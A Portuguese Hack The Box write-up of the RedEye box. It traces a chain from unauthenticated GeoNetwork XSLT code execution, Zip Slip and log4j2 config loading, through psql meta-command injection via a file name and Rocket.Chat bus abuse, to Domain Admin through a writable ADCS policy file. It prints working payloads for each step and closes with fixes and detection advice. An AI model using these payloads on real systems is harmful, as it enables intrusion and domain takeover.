---
title: "HTB RedEye: de um RCE no GeoNetwork ao Domain Admin pelo ADCS"
summary: "Uma box multi-máquina: o front leva ao GN01, o serviço de ingest leva ao domínio, e uma política de certificado gravável no DC01 entrega o Administrator. O caminho completo, com o porquê de cada passo."
seoTitle: "HTB RedEye: de RCE no GeoNetwork a Domain Admin via ADCS"
description: "Writeup do HTB RedEye: um RCE no GeoNetwork leva ao GN01, o serviço de ingest leva ao domínio e uma política de certificado ADCS gravável dá o Domain Admin."
date: 2026-11-16
lang: pt-br
target: "HTB RedEye (10.129.28.102 → 10.129.28.183)"
tags: ["adcs", "pkinit", "geonetwork", "rce", "active-directory", "sql-injection"]
pair: htb-redeye-en
draft: false
---

A RedEye é uma box multi-máquina do Hack The Box. O endereço que a plataforma entrega, `10.129.28.102`, é só a borda: atrás dele existem três máquinas, e o objetivo é o domínio. Este writeup segue a chain que funcionou, na ordem em que aconteceu, e explica o mecanismo de cada passo junto com o comando. No fim estão as rotas que fecharam e o que eu levaria para o próximo alvo.

As saídas de terminal foram organizadas em painéis legíveis a partir dos registros da sessão; o print de RDP é uma captura real. Senhas, hashes e flags aparecem omitidos.

## O cenário

A box foi redeployada no meio da sessão. O front mudou de `10.129.28.102` para `10.129.28.183`, mas o layout não: o endereço é a NIC externa do DC01 com DNAT para a rede interna, e os mesmos três hosts continuaram atrás dele.

| Host | IP | Papel |
| --- | --- | --- |
| FRONT | `10.129.28.102` / `.183` | NIC externa do DC01; o DNAT decide o backend |
| GN01 | `192.168.100.2` | Ubuntu, GeoNetwork 4.4.11 e Rocket.Chat 8.8.0 |
| DC01 | `192.168.100.1` | Windows Server 2022, Domain Controller, ADCS e ADFS |
| WKSTN01 | `192.168.100.3` | Estação Windows do domínio |

O front não expõe 445, 636 nem 135. O 443 termina no ADFS do DC01, mas sem credencial é só uma tela de login. O caminho que dava execução era o GN01, e é lá que o primeiro RCE cai.

![Mapa da chain: o acesso começa no formatter do GeoNetwork e termina no certificado emitido pelo CA do DC01](/img/redeye-01-path.webp)

A chain vencedora tem seis passos:

1. **RCE no GeoNetwork** (GN01), sem login, pelo upload de formatter.
2. **Escrita arbitrária + log4j2**, para transformar o RCE num canal estável.
3. **Injeção no ingest**, para sair de `geonetwork` e chegar em `gisops`.
4. **Credencial de serviço**, reutilizada como senha de domínio.
5. **Admin local no WKSTN01**, para ler o `user.txt`.
6. **Política de certificado no ADCS**, para virar Domain Admin e ler o `root.txt`.

Duas rotas paralelas foram confirmadas mas não eram necessárias para o root: o admin do Rocket.Chat pelo barramento Moleculer e o wildcard ADIDNS para coerção NTLM. As duas aparecem no texto e nas rotas que fecharam.

## Reconhecimento

Comecei com um scan completo de portas:

```bash
nmap -Pn -sT -p- --min-rate 500 -T4 --open 10.129.28.102
```

O resultado é pequeno:

| Porta | Serviço | Nota |
| --- | --- | --- |
| 22 | SSH | GN01 |
| 80 | HTTP | `geo.airways.htb`, GeoNetwork 4.4.11 |
| 443 | HTTPS | `sts.airways.htb`, ADFS no DC01 |
| 3000 | HTTP | `chat.airways.htb`, Rocket.Chat 8.8.0 |

Os três nomes resolvem para o mesmo IP; o vhost decide o backend. O `geo` cai no GeoNetwork do GN01, o `chat` no Rocket.Chat do GN01 e o `sts` no ADFS do DC01. O SSH também termina no GN01. Não há porta de gerenciamento do Windows exposta: para chegar ao DC01, é preciso entrar pelo GN01 primeiro.

## GeoNetwork: execução sem autenticação

O GeoNetwork é um catálogo geoespacial open source. Ele aceita *formatters*: bundles de XSLT que transformam metadados em HTML, PDF e outros formatos. O upload fica em `/srv/api/formatters`, e o render em `/srv/api/records/<uuid>/formatters/<nome>`.

O primeiro endpoint que respondeu sem sessão foi justamente o upload:

```http
POST /geonetwork/srv/api/formatters HTTP/1.1
Host: geo.airways.htb
Cookie: XSRF-TOKEN=<token anônimo>
X-XSRF-TOKEN: <token anônimo>
Content-Type: multipart/form-data

file=@formatter.zip;type=application/zip
```

O único controle é o cookie XSRF anônimo. O bundle aceito carrega um `view.xsl` que o Saxon, o motor XSLT do GeoNetwork, avalia com extensões Java habilitadas. Isso significa que o template pode chamar classes Java diretamente. O `Runtime.exec` do `java.lang` está a uma linha de distância:

```xml
<xsl:stylesheet version="2.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:rt="java:java.lang.Runtime">
  <xsl:template match="/">
    <xsl:result-document href="file:///tmp/run.sh" method="text">
      { id; hostname; } > /var/lib/geonetwork/data/resources/htmlcache/out.txt 2>&1
    </xsl:result-document>
    <xsl:value-of select="rt:exec(rt:getRuntime(),'/bin/sh /tmp/run.sh')"/>
  </xsl:template>
</xsl:stylesheet>
```

`result-document` escreve o script no disco; `rt:exec` chama o shell. O `GET` no registro que usa o formatter dispara o render, e a saída volta em `/geonetwork/htmlcache/out.txt`:

```text
uid=999(geonetwork) gid=989(geonetwork) groups=989(geonetwork)
GN01
```

![Requisição anônima ao formatter e a saída de id: o processo roda como geonetwork, uid 999](/img/redeye-02-geonetwork.webp)

Por que isso funciona? Três decisões se somam. O upload não exige autenticação; o motor XSLT aceita extensões Java; e não existe sandbox entre o template e o sistema operacional. Nenhuma delas é um RCE sozinha, mas juntas dão execução como `geonetwork`.

## De RCE intermitente a canal estável

O render do formatter funciona, mas depende do engine XSLT e de um record id válido. É um bom caminho para provar execução, não para trabalhar. Voltei ao mesmo upload com outra intenção: escrita arbitrária.

O formatter é um ZIP. O extrator usa o nome da entrada como caminho relativo e não normaliza o separador. Com backslash, uma entrada pode subir diretórios e sair do bundle. Oito níveis a partir de `/var/lib/geonetwork/data/formatter/<fmt>` chegam à raiz; o alvo útil é o webapp explodido:

```text
..\..\..\..\..\..\..\..\opt\geonetwork\apps\geonetwork\WEB-INF\classes\stage.sh
```

`WEB-INF/classes` é o diretório onde a JVM procura classes e configuração. Escrever ali é escrever no classpath da aplicação. O upload devolve 500, mas grava o arquivo antes de reclamar, e o erro entrega o caminho resolvido:

```json
{"message":"/var/lib/geonetwork/data/formatter/formatter1/../../../../../../../../opt/geonetwork/apps/geonetwork/WEB-INF/classes/stage.sh","code":"runtime_exception"}
```

Com escrita no classpath, o passo seguinte é o log4j2. O log4j2 é a biblioteca de log do Java; um XML de configuração pode declarar *appenders*, e um appender é uma classe carregada do classpath. Plantei um XML com `packages="org.fao.geonet.api"` e uma classe anotada `@Plugin` no mesmo pacote. O setting `system/server/log` aceita o nome do recurso:

```http
POST /geonetwork/srv/api/site/settings HTTP/1.1
Host: geo.airways.htb
Content-Type: application/x-www-form-urlencoded

system/server/log=log4j2-stage.xml
```

O `LogUtils.refreshLogConfiguration` carrega o recurso do classpath e aplica ao `LoggerContext`. O appender lê o comando de `cmd.txt` (plantado junto) e o executa como uid 999. Não é Log4Shell: não há JNDI lookup aqui. O vetor é a configuração de log carregada de um diretório em que conseguimos escrever.

![O caminho do ZIP até o classpath e o gatilho que recarrega o XML de log](/img/redeye-03-zipslip.webp)

O que era um RCE dependente de um render virou um canal repetível, com o mesmo usuário e sem tocar no serviço. A diferença importa: o primeiro caminho quebra quando o formatter muda; o segundo continua de pé.

## De geonetwork a gisops

O GN01 roda um stack de GIS: PostGIS, um spool em `/srv/gis/spool/incoming` e o `aodb-ingest.service`, disparado por `aodb-ingest.path`. Unidades *path* do systemd observam um diretório; quando um `.tif` aparece, o serviço roda como `gisops` e monta o comando assim:

```bash
layer=$(basename "${src%.*}")
raster2pgsql -s 4326 -d -I -C -F -t 256x256 "$src" "gis.${layer}" \
  | psql -q -d geonetwork_db -U gis_etl
```

O nome da tabela vem do nome do arquivo, sem quoting. O `raster2pgsql` gera SQL e o `psql` consome. Só que o `psql` também interpreta meta-comandos: um `\!` no stream executa um comando de shell no processo cliente. E o cliente é o `gisops`, mesmo que o usuário do banco seja `gis_etl`.

O arquivo não precisa ser um TIFF válido. Basta o nome:

```text
z";\! id > /tmp/gisops-id;-- .tif
```

O `id` sai como `gisops` (uid 997). O próximo alvo estava no diretório ao lado: `/etc/airport-gis/notify.env`, `root:gisops` e modo 0640, legível, portanto, pelo `gisops`.

```text
RC_USER=...
RC_PASS=<redacted>
```

A senha do Rocket.Chat era a senha de domínio de `gabby.t`. O bind LDAPS em 636 voltou `rc=0`, e o domínio tinha `lockoutThreshold=0`, sem bloqueio para quem quisesse testar.

![O script do ingest, o nome que injeta SQL e a execução como gisops; a senha do chat aparece redigida](/img/redeye-04-gisops.webp)

Três confianças se somam aqui: o nome do arquivo é tratado como identificador SQL; o `psql` aceita meta-comandos; e a conta de serviço lê um segredo que não deveria estar no seu alcance. Nenhuma delas precisaria existir para o ingest funcionar.

## O bus do Rocket.Chat não é uma fronteira

O Rocket.Chat é um servidor de chat em Node.js que usa o Moleculer, um framework de microserviços, para o barramento interno. O *transporter* é o canal de mensagens; no GN01 ele escuta em `127.0.0.1:36657`.

Depois do RCE, `127.0.0.1` deixa de ser local. O transporter aceita pacotes sem autenticação. O framing é simples: seis bytes de header, XOR dos bytes 1 a 5 no byte zero, tamanho big-endian e um tipo. O evento que interessa é `broadcast` no stream `local`, com destino `watch.settings`. O handler do MeteorService faz `settings.set(record)` direto no cache em memória.

Não é preciso ser admin para publicar no bus. O efeito é que a próxima conta registrada nasce com role `admin`:

```json
{"clientAction":"updated","setting":{"_id":"Accounts_RegistrationForm","value":"Public"}}
{"clientAction":"updated","setting":{"_id":"Accounts_ManuallyApproveNewUsers","value":false}}
{"clientAction":"updated","setting":{"_id":"Accounts_Registration_Users_Default_Roles","value":"admin"}}
```

Depois disso, `POST /api/v1/users.register` cria uma conta pelo fluxo público. Ela nasce com role `admin` porque o registro público passou a usar `admin` como padrão. A resposta confirma:

```json
{"success":true,"user":{"roles":["admin"]}}
```

![Injeção no barramento do Rocket.Chat e o registro de uma conta que nasce com role admin](/img/redeye-05-rocketchat.webp)

O mesmo canal ainda aceita `watch.integrations` com `clientAction: inserted`, o que permite inserir um webhook de saída sem passar pela API. Não precisei ir além para a chain do domínio, mas o primitivo está lá. A lição é que autorização no barramento não é opcional: quem publica um evento controla o estado que o evento atualiza.

## O domínio e o WKSTN01

Com `gabby.t`, a enumeração do AD por LDAPS 636 (LDAP sobre TLS) foi direta: usuários, grupos, ACLs, zonas DNS e templates. Só LDAPS; a 389 não existia. Dois achados mudaram o mapa.

O primeiro foi a zona ADIDNS `airwayhtb`. Zonas DNS podem viver dentro do AD, e essa concedia `CreateChild` a `Authenticated Users`: o direito de criar registros filhos. `gabby.t` criou um wildcard `*` apontando para `192.168.100.2`. O DNS do DC01 passou a servir esse A para qualquer nome inexistente em cerca de 30 segundos. É coerção NTLM passiva: qualquer serviço do DC01 que resolva um nome que não existe autentica para o GN01. Registros de host existentes não eram graváveis (`rc=50`) e update dinâmico não assinado era recusado (`rcode=9`). O relay para LDAPS e o RBCD chegaram a ser preparados, mas nenhum serviço do DC01 resolveu o nome inexistente na janela; a rota fechou.

O segundo foi `isabel.o`. A conta é membro **direto** de `BUILTIN\Administrators` no WKSTN01 (RID 1638):

```text
S-1-5-21-4146114734-3004133792-201478249-500   WKSTN01\Administrator
S-1-5-21-829808936-2739584302-670142182-512    AIRWAYS\Domain Admins
S-1-5-21-829808936-2739584302-670142182-1638   AIRWAYS\isabel.o
```

Isso é admin local da estação, aquém de Domain Admin. Mas admin local lê `C$` e `ADMIN$`, e o `user.txt` estava no desktop do Administrator local. A verificação foi feita duas vezes, inclusive por SAMR, e o contraste com `gabby.t` é o teste que separa privilégio de coincidência:

```text
ISABEL USER_TXT_LEN: 34
GABBY C$: ERR 0xc0000022 STATUS_ACCESS_DENIED
```

No DC01, `isabel.o` também tinha RDP, o grupo `GP Management` e acesso ao diretório de política do CA. A sessão RDP não era administrativa (a própria console avisa), mas era uma sessão de domínio válida em cima do Domain Controller:

![Sessão RDP em DC01 com isabel.o: o sconfig mostra o domínio e o nome do DC, e a console avisa que a sessão não é administrativa](/img/redeye-06-rdp.webp)

O caminho para escrever no DC01 foi essa sessão com um `cmd` em laço: ele buscava jobs no listener do GN01, executava e devolvia a saída. Foi esse beacon que criou o `C:\PolicyFiles\User.xml`. O pedido do certificado saiu do GN01 por DCOM/TCP 135 (o RPC de enrollment do ADCS), com a mesma conta.

## ADCS: o certificado que diz ser o Administrator

O ADCS é a PKI da Microsoft. Uma autoridade certificadora emite certificados com base em *templates*; o template define quem pode se inscrever, qual o EKU (Extended Key Usage, a finalidade do certificado) e o que vai no certificado. O SAN (Subject Alternative Name) é onde ficam os nomes alternativos. O PKINIT permite usar um certificado para logon Kerberos: o KDC valida o certificado e devolve um TGT (o ticket Kerberos inicial). A extensão SID pode carregar o identificador de segurança do usuário.

O CA `AIRWAYS-DC01-CA` usa o `TameMyCerts.Policy`, um módulo de política de terceiros que reescreve o SAN e adiciona extensões customizadas a partir de um XML por template. O `PolicyDirectory` é `C:\PolicyFiles`, e o esquema é `<TemplateName>.xml` relido **a cada pedido**, sem restart do serviço.

A ACL é o problema: `BUILTIN\Users` tem `(CI)(AD)` e `(CI)(WD)`, ou seja, pode criar arquivos novos. Os existentes, como `GroupPolicy_Audit.xml`, são imutáveis, o que dá a falsa sensação de que o diretório está protegido. O template `User` pode ser solicitado por Domain Users e tem EKU de client auth.

Criei `C:\PolicyFiles\User.xml` como `isabel.o`, com duas partes. A primeira limpa o SAN que o requerente já envia: as regras com `Value=""` e `Force=true` removem o UPN e o rfc822Name da isabel, e a regra seguinte injeta o UPN do Administrator. A segunda adiciona a extensão SID (`1.3.6.1.4.1.311.25.2`) com o DER do SID `-500`:

```xml
<CertificateRequestPolicy>
  <OutboundSubjectAlternativeName>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>rfc822Name</Field>
      <Value></Value>
      <Mandatory>false</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
    <OutboundSubjectRule>
      <Field>userPrincipalName</Field>
      <Value>Administrator@airways.htb</Value>
      <Mandatory>true</Mandatory>
      <Force>true</Force>
    </OutboundSubjectRule>
  </OutboundSubjectAlternativeName>
  <CustomCertificateExtensions>
    <CustomCertificateExtension>
      <Oid>1.3.6.1.4.1.311.25.2</Oid>
      <Value>MD2gOwYKKwYBBAGCNxkCAaAtBCtTLTEtNS0yMS04Mjk4MDg5MzYtMjczOTU4NDMwMi02NzAxNDIxODItNTAw</Value>
    </CustomCertificateExtension>
  </CustomCertificateExtensions>
</CertificateRequestPolicy>
```

O detalhe que queimou a primeira tentativa foi o SAN residual. Pedir o certificado com SAN `isabel` e SID `-500` devolveu `KDC_ERR_CLIENT_NAME_MISMATCH`: o KDC validou o nome do requerente, não o SID. Remover os SANs UPN e rfc822Name da isabel com as regras `Value=""` resolveu. O segundo pedido, REQID=30, template `User`, RSA-2048 via DCOM/TCP 135, voltou:

```text
DISP=0x3 REQID=30 MSG='Issued'
SAN=<OtherName(1.3.6.1.4.1.311.20.2.3, 'Administrator@airways.htb')>
SIDEXT=<DER de S-1-5-21-829808936-2739584302-670142182-500>
```

`DISP=0x3` significa emitido. O certificado é da isabel, mas diz ser o Administrator. O PKINIT acredita no SID:

```bash
certipy auth -pfx adm.pfx -username Administrator -dc-ip 192.168.100.1
```

```text
Got TGT
Got hash for 'administrator@airways.htb': <redacted>
```

O resto é pass-the-hash: usar o hash NT no lugar da senha. SMB no DC01 como `airways.htb/Administrator`, `C$`, e o `root.txt` no desktop. Domain Users → Domain Admin, sem reiniciar o CA e sem interação.

![A política do TameMyCerts, o certificado com SID -500 e a chain PKINIT até o Domain Admin](/img/redeye-07-adcs.webp)

O KDC não comparou o SID com a conta que fez o pedido; usou o SID do certificado. O certificado é da isabel, mas a identidade que ele carrega é a do Administrator. É essa diferença que o módulo de política deveria ter impedido.

## Inventário das falhas

| Onde | Falha | O que entrega |
| --- | --- | --- |
| GN01 | Upload de formatter sem autenticação + XSLT com Java | RCE como `geonetwork` |
| GN01 | Zip Slip no upload de formatter | escrita arbitrária no classpath |
| GN01 | Setting de log carrega XML do classpath | execução repetível como `geonetwork` |
| GN01 | Nome de tabela do `raster2pgsql` sem quoting + `psql \!` | shell como `gisops` |
| GN01 | `notify.env` legível pelo `gisops` + reutilização de senha | conta de domínio `gabby.t` |
| GN01 | Transporter Moleculer sem auth + cache de settings | admin do Rocket.Chat |
| DC01 | ADIDNS `CreateChild` para `Authenticated Users` | coerção NTLM passiva (rota não fechada) |
| WKSTN01 | `isabel.o` em `BUILTIN\Administrators` | `user.txt` |
| DC01 | `C:\PolicyFiles` gravável por Users + TameMyCerts | Domain Admin e `root.txt` |

## Rotas que fecharam

A box é grande, e a maior parte do tempo foi gasta em rotas que não fecharam. Vale registrar para não repetir:

- **ESC1–ESC8** não estavam disponíveis. São as variações clássicas de abuso de template (SAN que o requerente pode escolher, enrollment aberto, relay para HTTP etc.). O `OfflineRouter` tinha SAN que o requerente podia escolher, mas sem direito de enrollment.
- **ESC13/GPO** (abuso de OID de grupo dentro do certificado): `GPO-Auditors` era honeypot, e a varredura de ACLs com o parser do descritor de segurança (SD) correto não deu `WriteProperty` útil em GPO aplicado ao DC.
- **Relay LDAP 389** não existe; só LDAPS. A coerção RPC clássica não tinha Spooler, FSRVP, WebClient nem EFSRPC.
- **ADIDNS → LDAPS → RBCD** (delegação restrita baseada em recurso) foi montado até o wildcard, mas nenhum serviço do DC01 resolveu o nome inexistente na janela.
- **SQL no DC01**: apenas WID (Windows Internal Database), sem TCP 1433.
- **O hash DCC2 do Administrator** (credencial em cache no WKSTN01) foi esgotado no crack; as proteções `DPAPI`/Vault do WKSTN01 não entregaram nada utilizável.
- **Grupos built-in privilegiados** estavam vazios. **ADFS `/policy`** recusou as ações. **Root no GN01** e **hijack do XML de tarefas agendadas** não passaram.
- A box ainda caiu no meio da sessão e voltou com outro IP. O redeploy não mudou o estado do domínio.

## O que eu levaria para o próximo alvo

O diretório de política do CA é a materialização de uma ideia simples: se o módulo lê um arquivo cujo nome o atacante escolhe, e o diretório aceita arquivos novos, o atacante controla a política. Não é preciso escrever no serviço nem reiniciar nada. A correção é ACL restrita a Administrators/SYSTEM e uma política que não permita ao requerente impor SAN nem extensão SID. Para detectar, monitore escritas em `C:\PolicyFiles`, emissões com SID diferente do requerente e PKINIT de contas privilegiadas fora do padrão (eventos 4886/4887 e 4768).

O segundo detalhe é o KDC. Um certificado com SID `-500` vindo de outro requerente é um certificado de outra pessoa que diz ser Administrator. O PKINIT não validou a identidade do requerente contra o SID quando a política reescreveu o certificado. A lição é tratar a extensão SID como dado de autorização.

O terceiro é a fronteira. `127.0.0.1` não é autenticação depois que você tem código no host. O transporter do Moleculer, o cache de settings e o registro público formam uma chain de três passos que cria um admin do zero. O mesmo raciocínio vale para o `notify.env`: uma senha de serviço de chat era a senha de domínio de uma pessoa, e o domínio não tinha lockout.

Por último, o `raster2pgsql`: nome de arquivo não é identificador confiável. O `\!` do psql transforma uma injeção de nome de tabela em shell. Se o serviço roda como uma conta de serviço, o banco é o menor dos problemas. E se a zona DNS do AD aceita `CreateChild` de qualquer usuário autenticado, a coerção NTLM vira uma questão de tempo, mesmo que nessa box ela não tenha fechado.
